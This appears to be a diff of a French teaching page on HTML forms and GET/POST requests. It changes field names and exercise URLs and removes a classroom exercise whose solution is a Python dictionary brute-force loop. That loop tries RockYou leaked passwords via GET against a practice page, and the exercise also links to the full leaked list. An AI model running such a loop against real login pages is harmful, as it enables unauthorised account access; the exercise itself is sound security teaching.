@@ -12,7 +12,7 @@ Considérons le formulaire suivant, inclus dans une page html ouverte dans le na
 Le mot de passe est :
 <form action="cible2.php" method="get">
 <p>
-    <input type="password" name="pass" /> 
+    <input type="password" name="password" /> 
     <input type="submit" value="Valider" />
 </p>
 </form>
@@ -34,7 +34,7 @@ On aurait pu aussi avoir un type :
 - un bouton comportant le label «Valider» déclenchera l'envoi (grâce au type particulier ```submit```) des paramètres (ici un seul, la variable ```pass```) au serveur.
 
 #### Test :
-1. Rendez-vous sur la page [http://glassus1.free.fr/ex_get.html](http://glassus1.free.fr/ex_get.html){:target="_blank"} et testez un mot de passe.
+1. Rendez-vous sur la page [https://sofaugeras.com/ex_get.html](https://sofaugeras.com/ex_get.html){:target="_blank"} et testez un mot de passe.
 2. Observez attentivement l'url de la page sur laquelle vous êtes arrivés. Que remarquez-vous ?
 
 
@@ -54,14 +54,14 @@ Dans notre code de formulaire du 1.1, modifions l'attribut ```method```, auparav
 Le mot de passe est :
 <form action="cible2.php" method="post">
 <p>
-    <input type="password" name="pass" /> 
+    <input type="password" name="password" /> 
     <input type="submit" value="Valider" />
 </p>
 </form>
 ```
 
 #### Test :
-1. Rendez-vous sur la page [http://glassus1.free.fr/ex_post.html](http://glassus1.free.fr/ex_post.html){:target="_blank"} et testez un mot de passe.
+1. Rendez-vous sur la page [https://sofaugeras.com/ex_post.html](https://sofaugeras.com/ex_post.html){:target="_blank"} et testez un mot de passe.
 2. Observez attentivement l'url de la page sur laquelle vous êtes arrivés. Que remarquez-vous ?
 
 #### La méthode POST et la confidentialité :
@@ -77,7 +77,7 @@ Donc, la transmission du mot de passe est bien sécurisée par la méthode POST 
 
 ![](data/wireshark.png){: .center}
 
-Le contenu de la variable ```"pass"``` est donc visible dans le contenu de la requête. 
+Le contenu de la variable ```"password"``` est donc visible dans le contenu de la requête. 
 
 Le passage en ```https``` chiffre le contenu de la requête et empêche donc la simple lecture du mot de passe.
 
@@ -109,7 +109,7 @@ Du côté du serveur, le langage utilisé (PHP, Java...) doit récupérer les pa
 
  Notre exemple va contenir deux fichiers :
 
- - une page ```page1.html``` , qui contiendra un formulaire et qui renverra, par la méthode GET, un paramètre à la page ```page2.php```.
+ - une page ```page1.html``` , qui contiendra un formulaire et qui renverra, par la méthode GET, un paramètre à la page ```page2.php```. Vous pouvez tester [https://sofaugeras.com/form_os.html](https://sofaugeras.com/form_os.html)
  - une page ```page2.php``` , qui génèrera un code ```html ``` personnalisé en fonction du paramètre reçu.  
 
 #### ```page1.html``` 
@@ -181,89 +181,5 @@ L'exemple ci-dessus est un mauvais exemple : rien ne justifie l'emploi d'un serv
 L'envoi de paramètre à un serveur distant est nécessaire pour aller interroger une base de données, par exemple (lorsque vous remplissez un formulaire sur le site de la SNCF, les bases de données des horaires de trains, des places disponibles et de leurs tarifs ne sont pas hébergées sur votre ordinateur en local...).
 
 La vérification d'un mot de passe doit aussi se faire sur un serveur distant.
-
-
-## Exercice : attaque par force brute et requête GET :trident: Cyber :trident:
-
-![image](data/hackerman.png){: .center width=50%}
-
-
-#### Pré-requis 1 : le module ```requests``` en python
-
-Le module ```requests``` permet d'aller chercher le contenu d'une page web, suivant la syntaxe ci-dessous.
-Testez le code ci-dessous :
-
-```python linenums='1'
-import requests
-p = requests.get("http://glassus1.free.fr/interesting.html", verify = False)
-print(p.text)
-```
-
-La sortie en console est :
-
-```
-<!DOCTYPE html>
-<html>
-
-<head>
-
-<title>Waouh</title>
-</head>
-
-<body>
-Ceci est vraiment une jolie page web.
-</body>
-
-</html>
-``` 
-
-Notre programme Python se comporte donc «comme un navigateur» : il se rend sur une page, effectue une requête et récupère la page renvoyée.
-
-
-#### Pré-requis 2 : l'extraction d'un fichier texte sous forme de liste
-
-Le code ci-dessous permet de collecter dans une liste ```mots``` l'ensemble des mots compris dans le fichier ```monfichiertexte.txt``` (si celui-ci comprend un mot par ligne) 
-
-```python
-mots = open("monfichiertexte.txt").read().splitlines()
-```
-
-#### Exercice :
-Votre objectif est de trouver le mot de passe demandé sur la page [http://glassus1.free.fr/exoBF.html](http://glassus1.free.fr/exoBF.html){:target="_blank"}
-
-Vous allez vous appuyer sur un leak (*fuite*) très célèbre de mots de passe , qui est le leak du site Rockyou. Dans la base de données de ce site, 32 millions de mots de passe étaient stockés en clair ```¯\_(ツ)_/¯```.
-
-Lorsque le site a été piraté (par une injection SQL, voir le cours de Terminale), ces 32 millions de mots de passe se sont retrouvés dans la nature. Ils sont aujourd'hui téléchargeables librement, et constituent un dictionnaire de 14 341 564 mots de passe différents (car parmi les 32 millions d'utilisateurs, beaucoup utilisaient des mots de passe identiques).
-Ce fichier est téléchargeable [ici](https://www.kaggle.com/wjburns/common-password-list-rockyoutxt){:target="_blank"}, mais attention il pèse 134 Mo.
-
-Nous allons utiliser un fichier beaucoup plus léger ne contenant que les 1000 premiers mots de passe :
-Le jeu de données : [Rockyou](./data/extraitrockyou.txt){. target="_blank" .md-button }
-
-
-L'un de ces mots de passe est le mot de passe demandé à la page  [http://glassus1.free.fr/exoBF.html](http://glassus1.free.fr/exoBF.html){:target="_blank"} .
-
-Lequel ?
-
-??? note "Correction"
-    ```python linenums='1'
-    import requests
-
-    page_error = requests.get("http://glassus1.free.fr/repBF.php?pass=")
-
-    liste_mdp = open("extraitrockyou.txt").read().splitlines()
-
-    url = "http://glassus1.free.fr/repBF.php?pass="
-
-    for mdp in liste_mdp:
-        new_url = url + mdp
-        print(new_url)
-        page_tentative = requests.get(new_url)
-        if page_tentative.text != page_error.text:
-            print("Le mot de passe est le suivant :", mdp)
-            break
-    ```
-
-
-
 
 
